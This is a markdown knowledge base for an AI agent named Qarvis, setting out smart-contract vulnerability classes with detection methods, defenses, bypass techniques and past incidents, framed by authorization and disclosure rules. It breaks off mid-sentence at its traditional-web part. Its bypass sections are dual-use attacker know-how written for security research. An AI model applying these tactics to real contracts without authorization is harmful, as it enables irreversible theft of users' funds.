# Bug Bounty for Qarvis

> **Qarvis agent-brain knowledge base — offensive security reasoning module.**
> Owner: Qasim (handle *Codersqs*, Hackersray, CEH). Sialkot, Pakistan.
> Purpose: give Qarvis the mental model of an elite, creative bug bounty hunter and
> security researcher, so it can reason through engagements alongside its operator.

---

## 0. Operating doctrine (read this first, every time)

This file is a **reasoning module**, not a glossary. When Qarvis helps with a target,
it should *think* the way the best hunters think, not just recall definitions.

### 0.1 The core reasoning habit — "assume there is a bypass"

The single most valuable instinct in this whole file:

> **Every control is a speed bump, not a wall. When you see a defense, your first
> thought is "how is this bypassed?" — never "this is protected, move on."**

Defenders build controls; attackers find the one input, state, or sequence the
builder did not imagine. So for every protection Qarvis meets — a CSRF token, an
auth check, an authorization check, a WAF rule, an input filter, a reentrancy guard,
a signature check — it should reflexively run down the known bypass families for
*that* control before concluding anything is safe. "There is a validation here" is
the beginning of the investigation, not the end.

This is **not** permission to attack anything. It is a way of *thinking* applied only
to systems you are authorized to test.

### 0.2 Scope and ethics (hard rule)

Qarvis operates **only** inside authorized work: a bug bounty program's defined scope,
a signed pentest engagement, a CTF, a lab you own, or your own code. Outside that:
no testing, no payloads, no exploitation. Before acting, Qarvis confirms:

- **In scope?** Asset, domain, contract address, and attack type are all inside the
  program/engagement rules. Out-of-scope assets and prohibited test types (e.g. DoS,
  social engineering, physical, automated scanning the program forbids) are off-limits.
- **Non-destructive by default.** Prove impact with the minimum necessary — a
  read-only PoC, a benign marker, a single test record — never mass exfiltration,
  data destruction, or anything that degrades service for real users.
- **Responsible disclosure.** Findings go to the program/owner through the proper
  channel. No public drop, no extortion, no selling, no sitting on it.
- **Stop and ask.** If a step would touch real user data, real funds, production
  integrity, or anything the rules don't clearly allow — stop and check with the
  operator first.

### 0.3 The hunter's loop (how to approach any target)

1. **Map.** Enumerate everything: endpoints, params, hosts, roles, state machines,
   contracts, token flows, trust boundaries. Attack surface you can't see, you can't
   test. Most bounties are won in recon.
2. **Model trust.** Who is trusted, by whom, for what? Every arrow where "A trusts B
   to have checked X" is a candidate bug — because maybe nobody checked X.
3. **Hypothesize.** For each input and each control, name a concrete failure: "if the
   token isn't bound to the session, I can replay it"; "if the price is read from a
   single pool, I can move it."
4. **Probe minimally.** Smallest test that confirms or kills the hypothesis.
5. **Chain.** A low-severity bug is often a step in a critical chain (open redirect →
   SSRF → cloud metadata → RCE; IDOR → account takeover). Always ask "what does this
   unlock?"
6. **Prove impact.** Demonstrate business/real-world consequence, not just the
   technical quirk. That's what gets paid and what gets fixed.
7. **Report clearly.** Reproducible steps, root cause, impact, and a concrete fix.

### 0.4 Severity lens

This file is ordered **critical → high → medium → low** within each world (Web3 first,
then traditional web), using impact × likelihood as the rough CVSS-style lens. But
severity is *contextual*: an "info leak" that exposes a session token is critical; a
"critical" class behind five mitigations may be a non-issue. Judge the chain, not the
label.

### 0.5 "Why This Matters" is woven in, not bolted on

Every class below ends with a short **Why it matters** note — the real-world stakes
for companies, clients, end users, and (where relevant) governments and critical
infrastructure. A consolidated framework lives in **Part III**. Impact reasoning is
half the job: it's how you triage, how you prioritize, and how you justify severity.

---

# PART I — WEB3 / BLOCKCHAIN

Smart-contract bugs are uniquely brutal: code is public, value is on-chain and often
**irreversible**, exploits are atomic and automated, and an attacker anywhere can
borrow unlimited capital for one transaction via flash loans. There is no "undo," no
chargeback, no fraud department. A single logic flaw can drain a protocol to zero in
one block. Treat every external call, every price read, every privileged function,
and every signature as hostile until proven otherwise.

Reference frameworks worth internalizing: the **SWC Registry**, **SCSVS** (Smart
Contract Security Verification Standard), the **DeFi threat matrix**, and the public
post-mortems on *rekt.news*, *BlockSec*, *ChainSecurity*, *Trail of Bits*, and
*Immunefi* disclosures.

---

## CRITICAL (Web3)

### 1. Reentrancy

**What it is.** A contract makes an external call (sends ETH, or calls another
contract) *before* it finishes updating its own state. The called contract — the
attacker's — calls back *into* the victim before the first invocation has settled.
The victim is now acting on stale state. Classic case: a withdraw function that sends
ETH, then zeroes the balance. The attacker re-enters at the "send ETH" step while
their balance still reads full, and withdraws again and again.

This is the bug that caused **The DAO** hack (2016, ~3.6M ETH), which led to the
Ethereum/Ethereum Classic fork — the defining event of smart-contract security.

**Variants (know all four):**
- **Single-function reentrancy.** Re-enter the *same* function before its state update.
- **Cross-function reentrancy.** Re-enter a *different* function that shares the same
  unupdated state (e.g. `withdraw()` calls out; attacker re-enters `transfer()` which
  still sees the old balance).
- **Cross-contract reentrancy.** State is split across contracts; one is updated, a
  second (read by the attacker mid-call) is not yet consistent.
- **Read-only reentrancy.** The killer modern variant. A `view` function — usually
  *unguarded*, because it doesn't change state — returns a value computed from state
  that is momentarily inconsistent *during* another contract's operation. A **third**
  protocol that reads that view as an oracle/price is tricked. Example pattern: Curve
  pool `get_virtual_price()` can be manipulated by re-entering it during
  `remove_liquidity`; integrating protocols (price feeds for lending) read the wrong
  value and let the attacker over-borrow. Real cases: **dForce** (Feb 2023, ~$3.7M)
  used Curve as a price oracle and was hit through exactly this vector; **Conic
  Finance** (Jul 2023, ~$3.2M) had a reentrancy guard whose ETH-pool check assumed the
  wrong address (ETH placeholder vs WETH), so the guard was silently bypassed.

**How it's found/tested.** Grep for the pattern "external call *then* state write."
Look for `.call{value:}`, `transfer`, `send`, ERC-777 `tokensReceived` /
`tokensToSend` hooks, ERC-721/1155 `onERC...Received` callbacks, any call to a
user-supplied address. Trace whether balances/flags are updated **before or after**
that call. For read-only: find every `view` used as an oracle by *other* contracts
and ask whether it can be read during a state transition of this one. Tools: Slither
(`reentrancy-*` detectors), Foundry invariant/fork tests that re-enter.

**Defenses commonly deployed.**
- **Checks-Effects-Interactions (CEI):** validate, update state, *then* make external
  calls. The primary fix.
- **Reentrancy guards / mutex:** OpenZeppelin `nonReentrant` modifier (a `_status`
  lock).
- **Pull-over-push** payment patterns (users withdraw their own credited balance).
- Avoiding ERC-777/callback tokens, or handling their hooks carefully.

**Bypass techniques (assume the guard is imperfect):**
- **Guard only on some functions.** `nonReentrant` on `withdraw()` but not on
  `claimRewards()` that touches the same balance → **cross-function** re-entry around
  the lock. Enumerate *every* function touching the shared state; one unguarded
  entrypoint breaks the mutex.
- **View functions are almost never guarded** → **read-only reentrancy** sails past
  `nonReentrant` entirely, because the guard doesn't protect reads. If a protocol
  reads *your* target's view mid-operation, that's your vector.
- **Cross-contract guards don't compose.** A mutex on contract A doesn't lock
  contract B that shares logical state. Re-enter via B.
- **Guard-check logic bugs.** Conic's guard mis-identified the pool token (expected
  the ETH placeholder, pool used WETH), so the "is this re-entrant?" check returned
  false. Any guard that depends on an *assumption about addresses/flags* can be walked
  around by making that assumption false.
- **Callback tokens.** ERC-777 `tokensReceived` / NFT `onReceived` hooks give the
  attacker a re-entry point even when the dev "only" transfers a token and thought no
  external code ran. CREAM Finance (Aug 2021, ~$18.8M via AMP) was classic reentrancy
  through an ERC-777 callback.
- **Gas-based assumptions.** Relying on `transfer`/`send`'s 2300 gas stipend to
  prevent re-entry is obsolete and fragile (gas costs change with hard forks; it also
  breaks legitimate smart-contract wallets). Never trust it as a guard.

**Why it matters.** Reentrancy is the archetypal *irreversible total-loss* DeFi bug:
one transaction drains protocol funds that belong to thousands of users, with no
recovery. For the protocol it's often fatal (insolvency, token collapse, shutdown).
For users it's permanent loss of real money. For the ecosystem it erodes trust in
the whole chain — The DAO literally split Ethereum in two.

---

### 2. Access control failures

**What it is.** A privileged action (mint, upgrade, withdraw treasury, set oracle,
pause) is callable by someone who shouldn't be able to call it — because a modifier is
missing, wrong, or defeatable; because an initializer is left open; or because
ownership/role logic is broken.

**Common concrete forms:**
- **Missing modifier.** A `mint()` or `withdraw()` with no `onlyOwner`/role check at
  all.
- **Unprotected initializer.** A proxy's `initialize()` (which sets the owner) is not
  guarded, so *anyone* can call it first and become owner. The **Parity multisig**
  (Jul & Nov 2017) disasters: an unprotected `initWallet`/library made the attacker
  owner; the second time they called `selfdestruct` and froze ~513K ETH forever.
- **`tx.origin` for auth.** Using `tx.origin == owner` instead of `msg.sender` — a
  malicious intermediary contract the owner is tricked into calling passes the check.
- **Wrong/absent role on a sensitive setter** (change price oracle, upgrade logic,
  change fee recipient).
- **Default/implicit visibility** (pre-0.5 Solidity functions defaulted to `public`).

**How it's found.** Enumerate every state-changing external/public function; for each,
ask "who is *supposed* to call this, and what enforces it?" Flag any with no modifier,
a `tx.origin` check, or an initializer callable more than once / by anyone. Check that
`_disableInitializers()` is used in implementation constructors for upgradeable
contracts. Slither (`suicidal`, `unprotected-upgrade`, `arbitrary-send`), plus manual
role-matrix review.

**Defenses.** `onlyOwner` / OpenZeppelin `AccessControl` roles / `Ownable2Step`;
`initializer` modifier + `_disableInitializers()`; `msg.sender` (never `tx.origin`);
timelocks and multisig on the most sensitive actions.

**Bypass techniques:**
- **Front-run the initializer.** If `initialize()` is unprotected, watch the mempool
  and call it in the same block it's deployed/before the deployer does → you are owner.
- **Re-initialization.** `initializer`/`reinitializer` misuse, or an `initialize` that
  can be called again after an upgrade, lets you reset owner/critical params.
- **Phishing `tx.origin`.** Get the privileged EOA to call *your* contract (airdrop
  claim, "verify your wallet"); your contract then calls the victim and passes the
  `tx.origin == owner` check.
- **Role-admin confusion.** If an attacker-reachable role can grant itself or others
  a higher role (misconfigured `DEFAULT_ADMIN_ROLE` or `setRoleAdmin`), escalate.
- **Delegatecall into a library whose storage layout lets you overwrite the owner
  slot** (see Delegatecall, below) — an *indirect* access-control break.
- **Signature-based auth with no replay protection** → reuse a privileged signed
  message (see Signature replay).

**Why it matters.** Access-control bugs are consistently the **#1 cause of DeFi loss
by dollar value**. "Anyone can call mint/upgrade/withdraw" is instant, total,
irreversible protocol drain or permanent freeze. For the owning company it's
existential; for users, gone funds; and for any on-chain system holding custody of
others' assets (bridges, custodians), it's a direct hit to everyone downstream.

---

### 3. Oracle manipulation

**What it is.** A protocol reads an external price (for collateral valuation,
liquidations, minting) from a source an attacker can move — typically the **spot
price of an on-chain AMM pool**. Move the pool, and the protocol values your
collateral wrongly, letting you borrow/mint/redeem far more than you should.

**How it's found.** Find where the protocol gets prices. Is it a single DEX pool's
`getReserves()`/spot ratio? Low-liquidity pair? No time-averaging? Then it's
manipulable, usually *amplified by a flash loan* (below). Check for `slot0` on Uniswap
v3 (instantaneous, manipulable) vs a TWAP; check whether the oracle can be moved and
read in the **same transaction**.

**Defenses.**
- **TWAP** (time-weighted average price) — averages over a window, so a single-block
  spike doesn't stick.
- **Decentralized oracle networks** (Chainlink et al.) aggregating many off-chain
  sources.
- Multiple independent feeds + sanity/deviation bounds + circuit breakers.
- Using deep-liquidity references, not the project's own thin pool.

**Bypass techniques:**
- **Thin-pool / low-liquidity attack.** Even a "decentralized" setup fails if the
  priced asset's only real liquidity is one shallow pool you can move cheaply.
- **TWAP is not immune.** Over a short window, or on a low-liquidity pair, a
  multi-block push (or sustained pressure, feasible on cheap-block chains) can still
  drag the average. Manipulate across the exact window length.
- **Manipulate a dependency the oracle trusts.** **Read-only reentrancy** (above)
  corrupts a `get_virtual_price`-style value that a feed consumes — the feed itself is
  "honest," but its input is poisoned.
- **Stale / unchecked feed data.** If the integrator doesn't check Chainlink's
  `updatedAt`/`answeredInRound`/round completeness, use a moment the feed is stale or
  (on L2s) the sequencer is down to trade against an old price.
- **Attack the collateral token directly** (rebasing/fee-on-transfer/mintable tokens
  whose "price" or balance you control).
- **Spot pump without a loan.** **Mango Markets** (Oct 2022, ~$114M): the attacker
  used their own capital across two accounts to pump MNGO spot, which fed Mango's
  oracle, then borrowed against the inflated collateral — no flash loan needed.

**Why it matters.** Oracle manipulation turns "correct" code against itself: the
contract does exactly what it's told, with a lie for input. It's a top-three DeFi loss
category. Protocols go instantly insolvent; lenders eat bad debt; stablecoins
depeg. Users holding the protocol's token or deposits lose real money with no recourse.

---

### 4. Flash loan attacks (the amplifier)

**What it is.** A flash loan lets anyone borrow a near-unlimited amount with **zero
collateral**, provided it's repaid in the *same transaction* (else the whole tx
reverts). Flash loans are not themselves a bug — they're a capital amplifier that
turns a *theoretical* economic/logic flaw into a *practical, well-funded* exploit.
Any attack whose profit scales with capital becomes available to a penniless attacker.

**What they amplify:**
- **Oracle manipulation** — borrow millions to move a pool price far enough to matter
  (**bZx**, Feb 2020, the first prominent cases: a single Kyber feed let the attacker
  over-leverage; bZx later added Chainlink).
- **Governance capture** — borrow governance tokens for one block, pass a malicious
  proposal (**Beanstalk**, Apr 2022, ~$182M: ~$1B in Aave flash loans bought >67%
  voting power to pass a proposal that drained the protocol; see Governance).
- **Reentrancy, rounding, and economic-invariant breaks** — any imbalance that pays
  out more per dollar in than it should.

**How it's found.** For every economic function, ask: "if I had a billion dollars for
one transaction, does any invariant break — price, share ratio, reward rate, vote
weight, collateral factor?" Model the whole attack as one atomic tx: borrow → distort
→ profit → repay. Fork-test it in Foundry.

**Defenses.**
- Remove single-block price dependence (TWAP, robust oracles).
- Make governance require tokens held across a **snapshot/voting delay** so one-block
  borrowed balances don't count.
- Per-block action limits, and invariants that must hold regardless of input size.
- `require` economic invariants explicitly (share price can't drop on deposit, etc.).

**Bypass techniques (against flash-loan defenses):**
- **"Flash-loan guards" are weak.** Blocking `tx.origin != msg.sender` or same-block
  deposit+action is routinely bypassed by splitting across blocks (on cheap chains),
  using multiple contracts, or sourcing capital another way (own funds à la Mango,
  flash-*mint*, or JIT liquidity).
- **Snapshot gaps.** If governance snapshots at proposal time but lets you *vote* with
  a later-acquired balance, or vice versa, time the borrow to the counted moment.
- **Oracle that updates within the attack window** is still movable even with a TWAP
  if the window is short.

**Why it matters.** Flash loans democratize catastrophic attacks: the barrier to
draining a protocol is *skill*, not *capital*. This is why "it would cost too much to
attack" is never a valid defense in DeFi. Losses are immediate, large, irreversible.

---

### 5. Bridge exploits

**What it is.** Cross-chain bridges hold enormous pooled value and must verify
"something happened on chain A" before releasing funds on chain B. That verification —
signatures, Merkle proofs, message formats, custody keys — is the most attacked
surface in all of crypto. Bridges account for several of the largest hacks ever.

**Failure modes & real cases:**
- **Signature-verification bypass.** **Wormhole** (Feb 2022, ~$326M): a flaw let the
  attacker forge the guardian signature set / spoof validation and mint 120k wETH
  unbacked. Root cause class: the "is this message validly signed by the trusted set?"
  check could be satisfied without real signatures.
- **Trusted root set to a trivial value.** **Nomad** (Aug 2022, ~$190M): a routine
  upgrade initialized a trusted Merkle root to **zero**, so *every* message proved
  valid. It became a free-for-all — hundreds of copycat addresses drained it by
  copy-pasting the first exploit tx with their own address. Teaches: a single bad
  initialization can make all proofs pass.
- **Arbitrary cross-contract call / message spoofing.** **Poly Network** (Aug 2021,
  ~$611M, later returned): the bridge accepted attacker-controlled target contract and
  method data, letting the attacker call a privileged function (`EthCrossChainData`)
  and reassign the bridge's keeper to themselves.
- **Private-key / validator compromise + governance slip.** **Ronin** (Mar 2022,
  ~$625M): 5-of-9 validator signatures were required; the attacker got 4 validator
  keys (spearphishing) *and* a 5th via a leftover delegation the Axie DAO had granted
  months earlier and never revoked. Not a code bug — an operational/governance and
  key-management failure.

**How it's found.** Model the verification precisely: what exactly proves a
withdrawal is legitimate? Can that proof be forged, replayed, or satisfied trivially
(zero root, empty signer set, default values after upgrade)? Who holds the keys, and
how many must collude or be phished? Are message fields (target, method, amount,
chain-id, nonce) all bound into the signed/proven data, or can some be swapped?

**Defenses.** Robust threshold signatures (and real key hygiene/HSMs), correct Merkle
verification, binding *all* message fields + nonce + chain-id into the proof, replay
protection, upgrade safety (no re-init of trusted roots to defaults), rate
limits/circuit breakers, independent monitoring that pauses on anomaly.

**Bypass techniques:** everything from the sub-cases above — forge/skip signature
checks; exploit a root/validator set reset to defaults after an upgrade; supply
arbitrary call targets if the bridge relays them unchecked; replay a valid proof on
another chain if chain-id isn't bound; compromise or socially engineer the key
holders, or exploit stale delegated authority.

**Why it matters.** Bridges are where the money *is* — single points holding hundreds
of millions. A bridge hack isn't one protocol's problem: it depegs wrapped assets
across *every* chain that trusts the bridge, cascades into every integrating protocol,
and (per repeated attribution to state actors like the Lazarus Group) directly funds
nation-state programs — making bridge security a genuine **national-security** issue,
not just a financial one.

---

### 6. Signature replay & verification flaws

**What it is.** Off-chain signatures (EIP-712 permits, meta-transactions, approvals,
bridge messages, gasless orders) are powerful but easy to get wrong. If a signed
message isn't uniquely bound to *one* use, on *one* chain, by *one* contract, it can
be **replayed**.

**Concrete flaws:**
- **No nonce** → the same signed action can be submitted many times.
- **No chain-id / no EIP-712 domain separator** → a signature valid on one chain (or a
  testnet, or a fork) is replayed on another.
- **No contract address in the domain** → a signature for contract A is replayed on an
  identical contract B.
- **`ecrecover` returns `address(0)` on malformed input** — if code doesn't reject
  `address(0)`, a crafted/empty signature "verifies" as the zero address, and any
  check that compares against a slot that is (or can be made) zero passes.
- **Signature malleability** — ECDSA `(r, s, v)` has a second valid `s`
  (`s' = n - s`); if a system uses the signature (or its hash) as a unique id without
  canonicalizing `s`, an attacker forges a second "different" valid signature for the
  same message. (OpenZeppelin's `ECDSA` library rejects high-`s`; rolling your own
  often doesn't.)
- **Missing deadline** → an old signed order executes long after intended.

**How it's found.** Find every `ecrecover`/`SignatureChecker` call and the struct
being signed. Check: is there a nonce (incremented on use)? chain-id? `verifyingContract`?
deadline? Is `address(0)` explicitly rejected? Is `s` bounded? Is the recovered signer
checked against the *intended* signer, not something attacker-influenced?

**Defenses.** EIP-712 typed data with a full domain separator (name, version,
chain-id, verifying contract); per-signer incrementing nonces; deadlines; reject
`address(0)`; enforce low-`s`; prefer audited libraries (OZ `ECDSA`,
`SignatureChecker` which also handles EIP-1271 contract signatures).

**Bypass techniques:**
- **Cross-chain / cross-contract replay** where domain binding is missing.
- **Malleability** to defeat naive "signature already used" sets keyed on raw sig
  bytes.
- **Zero-address trick** against code that forgot to reject it.
- **EIP-1271 abuse** — if a contract signer's `isValidSignature` is lax or
  attacker-controlled, "valid" signatures can be minted at will.
- **Nonce ordering / omission** — if nonces aren't strictly enforced per signer, or a
  batch skips the check, replay within the gap.

**Why it matters.** A replayable signature = repeatable theft: drain an approval
repeatedly, re-execute a withdrawal, forge bridge messages (see Wormhole). It's silent
(looks like legitimate signed activity) and, on-chain, irreversible. For users it
turns a one-time gasless approval into an open door.

---

### 7. Delegatecall injection, storage collision & proxy flaws

**What it is.** `delegatecall` runs *another contract's code* in the *calling
contract's storage and context* (`msg.sender`, `address(this)` stay the caller's).
Proxies (upgradeable contracts) depend on it. If the code being delegate-called is
attacker-chosen, or its storage layout doesn't match the proxy's, the attacker can
overwrite critical slots — including the owner/implementation pointer — and take over
or destroy the contract.

**Concrete flaws:**
- **Delegatecall to a user-supplied address** → attacker runs arbitrary code in your
  storage context (can rewrite owner slot, drain, `selfdestruct`).
- **Storage collision between proxy and implementation** — if slot 0 is `owner` in the
  impl but something else in the proxy, an innocent write clobbers the wrong variable.
- **Uninitialized / unprotected implementation contract.** The *logic* contract behind
  a proxy, if left initializable and not `selfdestruct`-protected, can be initialized
  by an attacker and `selfdestruct`ed — bricking every proxy that points to it. This is
  exactly the **Parity multisig** freeze (Nov 2017, ~513K ETH): the shared library was
  killed, freezing all wallets that delegated to it.
- **Function-selector clashes** between proxy and implementation.

**How it's found.** Find every `delegatecall` and ask who controls the target. Compare
proxy vs implementation storage layouts slot-by-slot (use `openzeppelin-upgrades`
layout checks). Confirm implementations call `_disableInitializers()` in their
constructor. Look for `selfdestruct` reachable on a logic contract.

**Defenses.** Never `delegatecall` an untrusted/variable address; use battle-tested
proxy patterns (UUPS/Transparent, **ERC-1967** standard storage slots, unstructured
storage) so layouts can't collide; `_disableInitializers()`; storage gaps in
upgradeable base contracts; thorough upgrade reviews.

**Bypass techniques:** supply a malicious implementation/target where the dev assumed
a trusted one; exploit a layout mismatch introduced by an upgrade that added/reordered
variables; initialize an unguarded implementation and seize or destroy it; use a
selector clash so a proxy admin function is unexpectedly callable by users (or vice
versa).

**Why it matters.** Delegatecall/proxy bugs give **total control** (rewrite the owner,
swap the logic) or cause **permanent freeze** (Parity: half a million ETH gone
forever, no exploit *profit* but total irreversible loss to thousands of users).
Because nearly all serious protocols are upgradeable, this surface is everywhere.

---

### 8. Governance attacks

**What it is.** On-chain governance lets token holders propose and vote on actions —
often including "move the treasury" or "upgrade the code." If voting power can be
**acquired cheaply and temporarily**, an attacker can pass a proposal that hands
themselves the protocol.

**Concrete forms:**
- **Flash-loan vote capture.** Borrow governance tokens for one transaction, reach
  quorum, pass a malicious proposal, repay. **Beanstalk** (Apr 2022, ~$182M): ~$1B in
  flash loans bought >67% of voting power to pass (via an emergency-execute path) a
  proposal sending the treasury to the attacker.
- **No timelock** between proposal passing and execution → no time for anyone to
  react/exit.
- **Low quorum / concentrated supply** → cheap to reach control.
- **Delegation and "emergency" fast-paths** that skip the normal delay.
- **Proposal with hidden/obfuscated calldata** that does more than it claims.

**How it's found.** Read the governance module: how is voting power counted and *when*
(live balance vs snapshot vs checkpoint)? Is there a timelock? Quorum? Any emergency
path that bypasses delay? Can a proposal execute arbitrary calls? Can voting power be
borrowed/flash-minted within the counted window?

**Defenses.** Snapshot voting power at a block **before** the proposal (so freshly
borrowed tokens don't count); voting delay + voting period + **timelock** before
execution; sane quorum; limit what proposals can call; `Governor` + `TimelockController`
patterns; guardian veto for emergencies.

**Bypass techniques:** exploit any emergency/fast path that skips the snapshot or
timelock (Beanstalk's emergency execution); if the snapshot is at the wrong moment,
time the borrow to it; accumulate delegated votes; split votes across many addresses
to dodge per-address limits; bury malicious intent in proposal calldata the voters
don't decode.

**Why it matters.** Governance capture is a *legitimate-looking* total takeover — the
protocol does exactly what "the community voted for." It drains treasuries (often the
protocol's entire runway and users' staked funds) irreversibly, and poisons the whole
premise of decentralized governance that the project sold to its users.

---

## HIGH (Web3)

### 9. Integer overflow / underflow & unsafe casts

**What it is.** Arithmetic that exceeds a type's range wraps around: `uint8(255)+1 = 0`,
`uint(0)-1 = 2^256-1`. A balance that underflows becomes astronomically large; a
supply that overflows wraps to near-zero. Pre-Solidity-0.8 this was silent and caused
major token hacks (e.g. the 2018 **BEC / batchOverflow** `transfer` that minted
effectively infinite tokens).

**Still live post-0.8 because:**
- **`unchecked { }` blocks** (used for gas) re-enable silent wrap.
- **Downcasting** (`uint256 → uint128/uint64`) truncates without reverting (until
  newer `SafeCast`), so a large value silently becomes small.
- **Inline assembly / Yul** does raw arithmetic with no checks.
- Multiplication-before-division **precision loss** and rounding (see Medium).

**How it's found.** Find `unchecked` blocks, casts to smaller types, assembly math,
and any user-influenced value in arithmetic. Ask: can this be driven to the type's
edge? Does a cast silently truncate attacker-controlled size?

**Defenses.** Solidity ≥0.8 checked math (default revert on over/underflow);
`SafeCast` for narrowing; audited fixed-point libs; careful ordering
(multiply-then-divide, mind rounding).

**Bypass techniques:** push arithmetic into an `unchecked` block that the dev added
"for gas" assuming inputs were bounded; feed a value that truncates on a downcast to
flip a comparison or a balance; exploit assembly paths that skip checked math.

**Why it matters.** A single wrap can mint unlimited tokens, zero out debt, or invert
a comparison that gates withdrawals — instant, irreversible loss or infinite
inflation that destroys a token's value.

---

### 10. Unchecked external calls / return values

**What it is.** Low-level `call`, `send`, and non-reverting token transfers return a
`bool` instead of reverting on failure. If the contract ignores that return value, it
proceeds as if a transfer/call succeeded when it **didn't** — crediting users who
weren't paid, marking debts repaid that weren't, etc. Related: many ERC-20s
(famously USDT) don't return a bool at all, so a naive `IERC20.transfer` either
reverts or silently "succeeds."

**How it's found.** Grep for `.call(...)`, `.send(...)`, `token.transfer(...)` whose
return isn't checked/`require`d; look for assumptions that an external call always
succeeds; check for `SafeERC20` usage vs raw calls; check handling of fee-on-transfer
and non-standard tokens.

**Defenses.** `require(success)` on every low-level call; OpenZeppelin `SafeERC20`
(`safeTransfer`/`safeTransferFrom`) which handles missing-return tokens; measure actual
received balance for fee-on-transfer tokens; handle the no-return case.

**Bypass techniques:** make a transfer *fail* (or receive hook revert) in a code path
the victim doesn't check, so state updates as if it succeeded (e.g. credited a
withdrawal that never sent); use a fee-on-transfer or rebasing token so the contract's
accounting (`amount` requested vs actually received) diverges and you extract the
difference.

**Why it matters.** Silent failures corrupt accounting: users get credited without
paying, or debts vanish — draining the protocol gradually or all at once. It's
insidious because nothing reverts and nothing looks wrong on-chain until the protocol
is insolvent.

---

### 11. Frontrunning / MEV / sandwiching

**What it is.** The mempool is public and block builders order transactions. Anyone
can see your pending tx and insert their own **before** (frontrun), **after**
(backrun), or **around** it (sandwich) for profit. A DEX swap with loose slippage gets
sandwiched: bot buys before you (pushing price up), you buy at the worse price, bot
sells after. "Secret" commit actions revealed in the mempool can be stolen or
preempted.

**How it's found.** Look for actions whose *ordering* or *public pre-image* matters:
swaps without tight slippage/deadline; claim/redeem races; auctions; commit-reveal
schemes with no hiding; liquidations; anything where "whoever goes first wins." Check
for `minAmountOut`/`deadline` params and whether they're enforced.

**Defenses.** Enforce `minAmountOut` + `deadline` (user-set slippage); **commit-reveal**
to hide intent until it can't be exploited; batch auctions / uniform clearing prices;
private mempools / order-flow (Flashbots Protect) to avoid public exposure;
MEV-resistant designs.

**Bypass techniques (against these mitigations):**
- **Slippage set too loose** (or defaulted to 100%) → sandwich anyway.
- **Weak commit-reveal** — if the commit leaks info (amount, or a guessable salt) or
  the reveal window lets a frontrunner act, steal it.
- **Reorg / backrun** to capture value even behind a private relay once included.
- **Generalized frontrunning bots** copy *any* profitable pending tx (including a
  hunter's own exploit tx — so test exploits privately).

**Why it matters.** MEV is a continuous, systemic tax extracted from ordinary users
(worse execution prices) and a theft vector for naively designed mechanisms. At scale
it's billions extracted, and it can make otherwise-correct protocols unusable or
unfair — a reputational and economic drain even when no "hack" occurs.

---

### 12. Weak randomness

**What it is.** On-chain "randomness" derived from values miners/validators or anyone
can see or influence — `block.timestamp`, `blockhash`, `block.prevrandao`/`difficulty`,
`block.number`, or `keccak256` of those — is **predictable or manipulable**. Used for
NFT trait rolls, lotteries, game outcomes, selection, it lets an attacker compute the
result in advance and only act when they win (and revert otherwise).

**How it's found.** Grep for randomness sources: `block.*`, `blockhash`, `prevrandao`,
hashing of block vars, or using a future blockhash. Ask: can the caller predict or
re-roll the outcome, or revert the transaction if the result is unfavorable (free
retry)?

**Defenses.** **Commit-reveal** with a secret revealed later; **verifiable random
functions** (Chainlink VRF) delivering provable off-chain randomness; avoid any
single-tx randomness that can be computed or reverted by the caller.

**Bypass techniques:**
- **Precompute** the result from on-chain inputs and call only when you win.
- **Revert-on-loss:** wrap the "random" action so that if the outcome is bad, the whole
  tx reverts (you pay only gas) — effectively infinite free retries until you win.
- **Validator influence** on `timestamp`/`prevrandao` where the stakes justify it.
- **Weak VRF integration** — if the VRF callback isn't properly gated or the request
  can be front-run/manipulated, bias it.

**Why it matters.** Rigged randomness lets attackers win every valuable NFT mint,
lottery, or game payout — draining prize pools and destroying fairness. For
gambling/gaming protocols it's existential; for users it's a stacked deck they can't
see.

---

## MEDIUM / LOW (Web3)

### 13. Denial of service & gas griefing

**What it is.** An attacker makes a contract function *always revert or run out of
gas*, freezing funds or blocking others. Classic forms: **unbounded loops** over a
user-growable array (push until iteration exceeds the block gas limit); **"push"
payments in a loop** where one recipient is a contract that reverts on receive,
blocking the whole batch (and auctions where a malicious bidder's refund reverts so
no one can outbid). Also griefing via forcing expensive operations on others.

**Defenses/bypass.** Pull-over-push (each user withdraws their own funds); bounded/
paginated iteration; don't let one external call's failure block everyone; cap
array growth. *Bypass:* find any loop over attacker-growable data or any batch that a
single reverting recipient can brick.

**Why it matters.** Frozen funds are, functionally, lost funds; a stuck auction or
payout erodes trust and can be irrecoverable without an upgrade.

### 14. Rounding / precision & first-depositor share inflation

**What it is.** Integer division rounds down; whoever benefits from the rounding
direction can skim. The famous **ERC-4626 "first depositor"/inflation attack**: the
first depositor into an empty vault deposits 1 wei, then *donates* a large amount
directly to the vault to inflate share price, so a later victim's deposit rounds to
**0 shares** and the attacker redeems the victim's funds.

**Defenses/bypass.** Virtual shares/assets offset (OZ ERC-4626), minimum initial
deposit / dead shares, round in the protocol's favor, check for direct-donation
sensitivity. *Bypass:* target vaults without the virtual-offset mitigation or with a
manipulable `totalAssets` (balance-based, so a donation moves it).

**Why it matters.** Steadily or sharply drains depositors; undermines every
vault/LP/lending share accounting, which is the backbone of DeFi.

### 15. Approvals, `permit`, deadlines & slippage hygiene

**What it is.** Unlimited `approve` (infinite allowance) means one compromised/
malicious spender contract drains the token forever; missing `deadline`/`minOut` on
swaps enables MEV (above); `permit` front-running and phishing (signing an off-chain
approval you don't understand) grants silent allowances.

**Defenses/bypass.** Approve exact amounts, revoke stale allowances, enforce
deadline+slippage, understand every signature before signing. *Bypass (attacker
view):* hunt for contracts holding large infinite allowances to an upgradeable/weak
spender; abuse permit phishing.

**Why it matters.** Infinite approvals are the mechanism behind most wallet-drain
phishing — the single biggest source of *end-user* crypto loss, independent of any
protocol bug.

### 16. Timestamp dependence

**What it is.** Logic that branches on `block.timestamp` for anything financially
meaningful can be nudged by validators (seconds-level, more on some chains). Usually
low severity, but a vector where tight timing gates value (deadlines, vesting cliffs,
randomness seeds).

**Why it matters.** Small manipulations can tip time-gated payouts or seeds; minor
alone, meaningful in a chain.

---

> **Web3 meta-lesson for Qarvis:** almost every great DeFi exploit is a *chain* —
> flash loan → oracle move → under-collateralized borrow; or read-only reentrancy →
> poisoned price → liquidation. Think in transactions and invariants, not single
> functions. And because loss is irreversible and often instant, the standard of
> proof is high: model it fully (fork test) before claiming it.

---

# PART II — TRADITIONAL WEB

Web bugs are about **trust boundaries**: the moment data crosses from "attacker
controls this" to "the app trusts this," something must validate it correctly — and
usually something doesn't. The reasoning habit from §0.1 is the whole game here: every
filter, every token, every auth check, every WAF rule is a control with known bypass
